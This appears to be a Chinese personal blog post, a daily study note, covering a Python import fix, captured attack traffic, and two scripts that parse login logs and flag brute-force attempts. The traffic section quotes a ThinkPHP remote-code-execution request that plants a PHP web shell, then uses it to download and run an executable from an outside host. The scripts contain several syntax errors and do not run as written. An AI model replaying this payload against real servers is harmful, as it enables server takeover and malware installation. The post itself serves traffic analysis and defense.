@@ -1,0 +1,511 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>3-25 | 熊猫在路上</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="python,流量分析">
+    <meta name="description" content="解决python命令行参数，利用模块完成以及流量payload发现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="3-25">
+<meta property="og:url" content="https://xiongmaozailushang.gitee.io/muggle/2020/03/25/3.25/index.html">
+<meta property="og:site_name" content="熊猫在路上">
+<meta property="og:description" content="解决python命令行参数，利用模块完成以及流量payload发现">
+<meta property="og:locale" content="ch">
+<meta property="article:published_time" content="2020-03-25T10:15:57.000Z">
+<meta property="article:modified_time" content="2020-03-25T10:59:19.762Z">
+<meta property="article:author" content="熊猫在路上">
+<meta property="article:tag" content="python">
+<meta property="article:tag" content="流量分析">
+<meta name="twitter:card" content="summary">
+    
+    <link rel="shortcut icon" href="/muggle/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/muggle/img/brand.jpg)">
+      <div class="brand">
+        <a href="/muggle/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/muggle/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">熊猫在路上</h5>
+          <a href="mailto:2439046455@qq.com" title="2439046455@qq.com" class="mail">2439046455@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/muggle/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/muggle/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                分类
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/muggle/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                标签
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/muggle/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                归档
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/xiongmaoyan" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/muggle/custom"  >
+                <i class="icon icon-lg icon-link"></i>
+                测试
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">3-25</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">3-25</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2020-03-25T10:15:57.000Z" itemprop="datePublished" class="page-time">
+  2020-03-25
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/muggle/categories/%E6%AF%8F%E6%97%A5%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BB%93/">每日学习小结</a></li></ul>
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#python"><span class="post-toc-number">1.</span> <span class="post-toc-text">python</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#无法识别包和模块"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">无法识别包和模块</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#流量发现"><span class="post-toc-number">2.</span> <span class="post-toc-text">流量发现</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#BlastingCheck-py"><span class="post-toc-number">3.</span> <span class="post-toc-text">BlastingCheck.py</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#demo"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">demo</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Getloginfo-py"><span class="post-toc-number">4.</span> <span class="post-toc-text">Getloginfo.py</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#demo-1"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">demo</span></a></li></ol></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-3.25"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">3-25</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2020-03-25 18:15:57" datetime="2020-03-25T10:15:57.000Z"  itemprop="datePublished">2020-03-25</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/muggle/categories/%E6%AF%8F%E6%97%A5%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BB%93/">每日学习小结</a></li></ul>
+
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>解决python命令行参数，利用模块完成以及流量payload发现</p>
+<a id="more"></a>
+
+<h1 id="python"><a href="#python" class="headerlink" title="python"></a>python</h1><h2 id="无法识别包和模块"><a href="#无法识别包和模块" class="headerlink" title="无法识别包和模块"></a>无法识别包和模块</h2><p>解决python中import时无法识别自己写的包和模块的方法</p>
+<blockquote>
+<p><a href="https://www.cnblogs.com/foreverlin/p/10846698.html" target="_blank" rel="noopener">https://www.cnblogs.com/foreverlin/p/10846698.html</a></p>
+</blockquote>
+<p>我们用pycharm打开自己写的代码，当多个文件之间有相互依赖的关系的时候，import无法识别自己写的文件，但是我们写的文件又确实在同一个文件夹中，</p>
+<p><strong>这种问题可以用下面的方法解决：</strong></p>
+<p>1）打开File–》Setting—》打开 Console下的Python Console，把选项（Add source roots to PYTHONPAT）点击勾选上</p>
+<p>2）右键点击自己的工作空间，找下面的Mark Directory as 选择Source Root，就可以解决上面的问题了！</p>
+<p>用的IDLE–<strong>Wing Personal 7.2</strong></p>
+<h1 id="流量发现"><a href="#流量发现" class="headerlink" title="流量发现"></a>流量发现</h1><blockquote>
+<p><a href="https://blog.csdn.net/weixin_34068198/article/details/89571126" target="_blank" rel="noopener">https://blog.csdn.net/weixin_34068198/article/details/89571126</a></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;public&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;echo%20^&lt;?php%20$action%20&#x3D;%20$_GET[&#39;xcmd&#39;];system($action);?^&gt;&gt;hydra.php HTTP&#x2F;1.1</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: zh-cn</span><br><span class="line">Referer: http:&#x2F;&#x2F;210.73.36.144:80&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;echo ^&lt;?php $action &#x3D; $_GET[&#39;xcmd&#39;];system($action);?^&gt;&gt;hydra.php</span><br><span class="line">User-Agent: Mozilla&#x2F;4.0 (compatible; MSIE 9.0; Windows NT 6.1)</span><br><span class="line">Host: 210.73.36.144</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET &#x2F;public&#x2F;hydra.php?xcmd&#x3D;cmd.exe%20&#x2F;c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;ero.bckl.ir&#x2F;download.exe&#39;,&#39;%SystemRoot%&#x2F;Temp&#x2F;mskmyvyvxpyurrd27191.exe&#39;);start%20%SystemRoot%&#x2F;Temp&#x2F;mskmyvyvxpyurrd27191.exe HTTP&#x2F;1.1</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: zh-cn</span><br><span class="line">Referer: http:&#x2F;&#x2F;210.73.36.144:80&#x2F;public&#x2F;hydra.php?xcmd&#x3D;cmd.exe &#x2F;c powershell (new-object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;ero.bckl.ir&#x2F;download.exe&#39;,&#39;%SystemRoot%&#x2F;Temp&#x2F;mskmyvyvxpyurrd27191.exe&#39;);start %SystemRoot%&#x2F;Temp&#x2F;mskmyvyvxpyurrd27191.exe</span><br><span class="line">User-Agent: Mozilla&#x2F;4.0 (compatible; MSIE 9.0; Windows NT 6.1)</span><br><span class="line">Host: 210.73.36.144</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="BlastingCheck-py"><a href="#BlastingCheck-py" class="headerlink" title="BlastingCheck.py"></a>BlastingCheck.py</h1><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">#--*-- coding:utf-8 --*--</span><br><span class="line"># author：  熊猫在路上</span><br><span class="line"># 在数据库中检测批量IP是否存在爆破行为</span><br><span class="line"># 需要有日志数据库文件，根据IP和域名后缀为唯一条件，在数据库中按逻辑判断爆破行为</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import datetime</span><br><span class="line">import sqlite3</span><br><span class="line">import argparse</span><br><span class="line"></span><br><span class="line">reault &#x3D; []</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">auth.log</span><br><span class="line"></span><br><span class="line">2018-12-31 00:00:14,imap,1103,username,xt996.top,192.168.1.1,localhost,Auth Success</span><br><span class="line">2018-12-31 00:00:18,imap,1103,username,xt996.top,192.168.1.1,localhost,Auth Success</span><br><span class="line">2018-12-31 00:00:15,imap,1103,username,xt996.top,192.168.1.1,localhost,Fail</span><br><span class="line">2018-12-31 00:00:15,imap,1103,username,xt996.top,192.168.1.1,localhost,Fail</span><br><span class="line">2018-12-31 00:00:16,imap,1103,username,xt996.top,192.168.1.1,localhost,Auth Success</span><br><span class="line">2018-12-31 00:00:17,imap,1103,username,xt996.top,192.168.1.1,localhost,Auth Success</span><br><span class="line">2018-12-31 00:00:19,imap,1103,username,xt996.top,192.168.1.1,localhost,Auth Success</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">fd &#x3D; open(&quot;auth.log&quot;,&quot;r&quot;)</span><br><span class="line">for line in fd.readlines():</span><br><span class="line">	reault.append(list(map(str,line.split(&#39;,&#39;))))</span><br><span class="line"></span><br><span class="line">f &#x3D; open(&quot;outinfo.txt&quot;,&#39;a&#39;)</span><br><span class="line"></span><br><span class="line">def outinfo(i,falg,firstfail,endfail):</span><br><span class="line">	f.write(str(firstfail)+&#39;,&#39;+str(endfail)+&#39;,&#39;+str(falg)+&#39;,&#39;+i[5]+&#39;,&#39;+i[3]+&#39;@&#39;+i[4]+&#39;,&#39;+i[7])</span><br><span class="line">	f.flush()</span><br><span class="line"></span><br><span class="line">def check(reault):</span><br><span class="line">	falg &#x3D; 0</span><br><span class="line">	print (&quot;start check&quot;)</span><br><span class="line"></span><br><span class="line">	for i in reault:</span><br><span class="line">		for line in i:</span><br><span class="line">			print (i[7])</span><br><span class="line">			if not i[7] &#x3D;&#x3D; &#39;Auth Success\n&#39;:</span><br><span class="line">				if falg &#x3D;&#x3D; 0:</span><br><span class="line">					firstfail &#x3D; i[0]</span><br><span class="line">					falg +&#x3D; 1</span><br><span class="line">				else:</span><br><span class="line">					if falg &gt;&#x3D; 1:#超过多少次判定为爆破</span><br><span class="line">						endfail &#x3D; i[0]</span><br><span class="line">						print (&quot;爆破次数：&quot;+str(falg)+str(i))</span><br><span class="line">						outinfo(i,falg,firstfail,endfail)</span><br><span class="line">						break</span><br><span class="line">						#检测登录成功跳出</span><br><span class="line">					else:</span><br><span class="line">						falg &#x3D; 0</span><br><span class="line">						firstfail &#x3D; &#39;&#39;</span><br><span class="line">						endfail &#x3D; &#39;&#39;</span><br><span class="line">						#爆破次数不满足条件清空</span><br><span class="line">			print (&quot;----------------------------&quot;)</span><br><span class="line"></span><br><span class="line">def selectinfo(file):</span><br><span class="line">	f &#x3D; open(args.o,&quot;a&quot;)</span><br><span class="line">	#连接数据库</span><br><span class="line">	conn &#x3D; sqlite3.connect(&#39;D:&#x2F;log.db&#39;)</span><br><span class="line">	c &#x3D; conn.cursor()</span><br><span class="line">	print (&quot;连接数据库成功&quot;)</span><br><span class="line">	#读取txt中IP、账号</span><br><span class="line">	check_list &#x3D; []</span><br><span class="line">	with open(file)as f:</span><br><span class="line">		i &#x3D; 0</span><br><span class="line">		for line in f:</span><br><span class="line">			i +&#x3D; 1</span><br><span class="line">			ip,uname,dname &#x3D; line.split(&#39;,&#39;)</span><br><span class="line">			dname &#x3D; dname.strip()</span><br><span class="line"></span><br><span class="line">			#带入数据库查询</span><br><span class="line">			print (&quot;----------------------------&quot;)</span><br><span class="line">			times &#x3D; datetime.datetime.now()</span><br><span class="line">			cursor &#x3D; c.excute(&quot;SELECT stime,client_ip,acct_name,domain_name,reault from auth where client_ip&#x3D;? and acct_name&#x3D;? and domain_name&#x3D;? group by stime&quot;,[(ip),(uname),(dname)])</span><br><span class="line">			print (&#39;start&#39;+str(i))</span><br><span class="line">			#print (dir(cursor))</span><br><span class="line">			#print (str(cursor.fetchall()))</span><br><span class="line">			</span><br><span class="line">			check(cursor.fetchall())</span><br><span class="line">			timee &#x3D; datetime.datetime.now()</span><br><span class="line">			print (timee-times)</span><br><span class="line">	conn.close()</span><br><span class="line">	f.close()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">	parser &#x3D; argparse.ArgumentParser(description&#x3D;&quot;在数据库中检测批量IP是否存在爆破行为&quot;)</span><br><span class="line">	parser.add_argument(&quot;-i&quot;,default&#x3D;&quot;auth-user.txt&quot;，metavar&#x3D;&quot;auth-user.txt&quot;,help&#x3D;&quot;需检测IP文本&quot;)</span><br><span class="line">	parser.add_argument(&quot;-o&quot;,default&#x3D;&quot;blasting.txt&quot;，metavar&#x3D;&quot;blasting.txt&quot;,help&#x3D;&quot;结果输出文本&quot;)</span><br><span class="line">	args &#x3D; parser.parse_args()</span><br><span class="line"></span><br><span class="line">	selectinfo(arg.i)</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Getloginfo-py"><a href="#Getloginfo-py" class="headerlink" title="Getloginfo.py"></a>Getloginfo.py</h1><h2 id="demo-1"><a href="#demo-1" class="headerlink" title="demo"></a>demo</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">#-*-coding&#x3D;utf-8-*-</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import datetime</span><br><span class="line">import sqlite3</span><br><span class="line">import argparse</span><br><span class="line"></span><br><span class="line">#定义文件名数组</span><br><span class="line"></span><br><span class="line">result&#x3D; []</span><br><span class="line">lines &#x3D; []</span><br><span class="line">datal &#x3D; &#123;&#125;</span><br><span class="line">data2&#x3D; &#123;&#125;</span><br><span class="line"></span><br><span class="line">#获取目录下所有文件名</span><br><span class="line">def get all(cwd):</span><br><span class="line">	get_dir &#x3D; os.listdir(cwd)</span><br><span class="line">	for i in get_dir:</span><br><span class="line">		sub_dir &#x3D; os.path.join(cwd,i)</span><br><span class="line">		if os.path.isdir (sub_dir):</span><br><span class="line">			get_all (sub_dir)</span><br><span class="line">		else:</span><br><span class="line">			result.append(i)</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">#打印所有文件名</span><br><span class="line">def readname(result):</span><br><span class="line">	for i in result:</span><br><span class="line">		print(i)</span><br><span class="line">	#print (result [0])</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">#依次输出每一行，分片提取信息</span><br><span class="line"></span><br><span class="line">def getinfo(result):</span><br><span class="line">	#写入文件</span><br><span class="line">	f_out &#x3D; open(args.o, &quot;a&quot;)</span><br><span class="line">	#切割字典</span><br><span class="line">	times&#x3D;datetime.datetime.now()</span><br><span class="line">	#print (result)#打印文件名</span><br><span class="line">	if args.f &#x3D;&#x3D; True:</span><br><span class="line">		for i in result:</span><br><span class="line">			#print (type(i) )</span><br><span class="line">			#打印字符串类型取前几个判断日志</span><br><span class="line">			#anal开头可以切片，按字典操作</span><br><span class="line">			print (&#39;处理&#39;+ i)</span><br><span class="line">			with open(args.p+i)as f:</span><br><span class="line">				for line in f:</span><br><span class="line">					#分割前后，后半部分为元组格式</span><br><span class="line">					head2,tail2 &#x3D; line.split(&#39;]: &#39;)</span><br><span class="line">					logstr2 &#x3D; tail2</span><br><span class="line">					logstr3 &#x3D; head2</span><br><span class="line">					#字符串转换列表，逗号切割为列表</span><br><span class="line">					loglist1 &#x3D; logstr2.split(&quot;,&quot;)</span><br><span class="line">					#切割时间</span><br><span class="line">					loglist2 &#x3D; logstr3.split(&quot;[&quot;)</span><br><span class="line">					#用户名、日期、IP、协议、登录状态、dname</span><br><span class="line">					#print (loglist1 [6]，loglist2[0]，loglist1[11]，loglist1[0], loglist1[13]，loglist1[8])</span><br><span class="line">					#data2 &#x3D; &#123;loglist1[6], loglist2[0], loglist1 [11],1oglist1[0], loglist1 [13], loglist1[8]&#125;#set类型</span><br><span class="line"></span><br><span class="line">					#写文件</span><br><span class="line">					f_out.write(loglist1[0] + &#39;,&#39; + loglist1[2] + &#39;\n&#39;)</span><br><span class="line">					#提取信息可以修改</span><br><span class="line"></span><br><span class="line">	else:</span><br><span class="line">		#写入文件</span><br><span class="line">		#创建数据库</span><br><span class="line">		conn &#x3D; sqlite3.connect(&#39;data.db&#39;)</span><br><span class="line">		#创建游标</span><br><span class="line">		c &#x3D; conn.cursor()</span><br><span class="line">		#创建表</span><br><span class="line">		c.excute(&quot;create table data1(uname,ctstr,ip,uah,dname)&quot;)</span><br><span class="line">		for i in result:</span><br><span class="line">			print (&quot;处理&quot; + i)</span><br><span class="line">			with open(args.p + i)as f:</span><br><span class="line">				for line in f:</span><br><span class="line">					#分割前后，后半部分为字典格式</span><br><span class="line">					head1,tail1 &#x3D; line.split(&#39;]: &#39;)</span><br><span class="line">					logstr1 &#x3D; tail1</span><br><span class="line">					#字符串转换字典</span><br><span class="line">					logdic &#x3D; eval(logstr1)</span><br><span class="line">					#用户名、日期、IP、UAH、dname</span><br><span class="line">					print (logdic[&#39;uname&#39;],logdic[&#39;ctstr&#39;],logdic[&#39;ip&#39;],logdic[&#39;uah&#39;],logdic[&#39;dname&#39;])</span><br><span class="line"></span><br><span class="line">					#写入数据</span><br><span class="line">					c.excute(&#39;insert into data1 values (?,?,?,?,?)&#39;,(logdic[&#39;uname&#39;],logdic[&#39;ctstr&#39;],logdic[&#39;ip&#39;],logdic[&#39;uah&#39;],logdic[&#39;dname&#39;]))</span><br><span class="line">					#提交数据库</span><br><span class="line">					conn.commit()</span><br><span class="line"></span><br><span class="line">		timee &#x3D; datetime.datetime.now()</span><br><span class="line">		print (timee-times)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">	parser &#x3D; argparse.ArgumentParser(description&#x3D;&quot;提取日志信息到文件或数据库&quot;)</span><br><span class="line">	parser.add_argument(&quot;-p&quot;,default&#x3D;r&#39;C:&#x2F;loganylics&#x2F;logfile&#x2F;&#39;，metavar&#x3D;&#39;C:&#x2F;loganylics&#x2F;logfile&#x2F;&#39;,help&#x3D;&quot;日志路径&quot;)</span><br><span class="line">	parser.add_argument(&quot;-o&quot;,default&#x3D;&quot;loginfo.txt&quot;，metavar&#x3D;&quot;loginfo.txt&quot;,help&#x3D;&quot;结果输出文本&quot;)</span><br><span class="line">	parser.add_argument(&quot;-s&quot;,action&#x3D;&quot;store_true&quot;,help&#x3D;&quot;默认选择导出数据库&quot;)</span><br><span class="line">	parser.add_argument(&quot;-f&quot;,action&#x3D;&quot;store_true&quot;,help&#x3D;&quot;选择导出文本&quot;)</span><br><span class="line">	args &#x3D; parser.parse_args()</span><br><span class="line"></span><br><span class="line">	get_all(args.p)</span><br><span class="line">	getinfo(result)</span><br></pre></td></tr></table></figure>
+
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2020-03-25T10:59:19.762Z" itemprop="dateUpdated">2020-03-25 18:59:19</time>
+</span><br>
+
+
+        
+        这里可以写作者留言，标签和 hexo 中所有变量及辅助函数等均可调用，示例：<a href="/muggle/2020/03/25/3.25/" target="_blank" rel="external">https://xiongmaozailushang.gitee.io/muggle/2020/03/25/3.25/</a>
+        
+    </div>
+    
+    <footer>
+        <a href="https://xiongmaozailushang.gitee.io/muggle">
+            <img src="/muggle/img/avatar.jpg" alt="熊猫在路上">
+            熊猫在路上
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/muggle/tags/python/" rel="tag">python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/muggle/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" rel="tag">流量分析</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://xiongmaozailushang.gitee.io/muggle/2020/03/25/3.25/&title=《3-25》 — 熊猫在路上&pic=https://xiongmaozailushang.gitee.io/muggle/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://xiongmaozailushang.gitee.io/muggle/2020/03/25/3.25/&title=《3-25》 — 熊猫在路上&source=解决python命令行参数，利用模块完成以及流量payload发现" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://xiongmaozailushang.gitee.io/muggle/2020/03/25/3.25/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《3-25》 — 熊猫在路上&url=https://xiongmaozailushang.gitee.io/muggle/2020/03/25/3.25/&via=https://xiongmaozailushang.gitee.io/muggle" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://xiongmaozailushang.gitee.io/muggle/2020/03/25/3.25/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
